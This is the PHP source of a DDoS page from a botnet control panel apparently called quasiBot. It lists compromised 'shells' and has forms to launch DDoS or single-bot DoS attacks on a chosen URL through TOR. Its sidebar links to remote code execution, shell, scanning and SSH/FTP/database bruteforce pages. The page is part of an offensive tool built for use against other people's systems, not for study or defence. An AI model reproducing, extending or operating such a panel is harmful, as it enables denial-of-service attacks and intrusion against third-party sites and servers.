<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | ddos</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="../index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com/') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta">
                            Current shells in db
                            <?php
                            showbots();
                            ?>
                            </p>
                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">DDoS</a></h2>
                        <div class="entry">
                        <p class="meta">
                        Attack with all bots &nbsp;&bull;&nbsp; via TOR &nbsp;&bull;&nbsp; UDP
                        </p>
                        
                        <table>
                        <tr><form method="post">
                        <td><b>URL</b></td><td><b>Action</b></td><td><b>Time</b></td></tr>
                        <tr>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 220px;\" value=\"". (empty($_POST['url'])?"website.com":htmlspecialchars($_POST['url'])) ."\" name=\"url\"></td>&nbsp;";
                            ?>
                        <td style="text-align: left;">
                            <input type="radio" name="sup" value="attack"> Attack<br/>
                            <input type="radio" name="sup" value="kill"> Kill<br />
                        </td>
                        <td style="text-align: left;">
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['time'])?"60":htmlspecialchars($_POST['time'])) ."\" name=\"time\"></td>&nbsp;";
                            ?>
                        </td>
                        <td><input type="submit" value="Go"></td>
                        </form>
                        </tr>
                        </table>  

                        <?php ddos(); ?>

                    </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">DoS</a></h2>
                        <div class="entry">
                        <p class="meta">
                        Attack with single bot &nbsp;&bull;&nbsp; via TOR &nbsp;&bull;&nbsp; UDP
                        </p>
                        
                        <table>
                        <tr><form method="post">
                        <td><b>Bot ID</b></td><td><b>URL</b></td><td><b>Action</b></td><td><b>Time</b></td></tr>
                        <tr>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['botid1'])?"0":htmlspecialchars($_POST['botid1'])) ."\" name=\"botid1\"></td>&nbsp;";
                            ?>         
                        </td>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 220px;\" value=\"". (empty($_POST['url1'])?"website.com":htmlspecialchars($_POST['url1'])) ."\" name=\"url1\"></td>&nbsp;";
                            ?>
                        <td style="text-align: left;">
                            <input type="radio" name="sup" value="attack"> Attack<br/>
                            <input type="radio" name="sup" value="kill"> Kill<br />
                        </td>
                        <td style="text-align: left;">
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['time1'])?"60":htmlspecialchars($_POST['time1'])) ."\" name=\"time1\"></td>&nbsp;";
                            ?>
                        </td>
                        <td><input type="submit" value="Go"></td>
                        </form>
                        </tr>
                        </table>  

                        <?php dos(); ?>

                    </div>
                    </div>
                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="../home/index.php">Index</a></li>
                                <li><a href="../home/settings.php">Settings</a></li>
                                <li><a href="../home/rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="rce.php">RCE</a></li>
                                <li><a href="scan.php">Scan</a></li>
                                <li><a href="pwn.php">Pwn</a></li>
                                 <li><a href="shell.php">Shell</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="../bf/ssh.php">SSH</a></li>
                                <li><a href="../bf/ftp.php">FTP</a></li>
                                <li><a href="../bf/dbs.php">DB's</a></li>
                                <li><a href="../bf/www.php">WWW</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="ddos.php"><b>DDoS</b></a></li>
                                <li><a href="more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
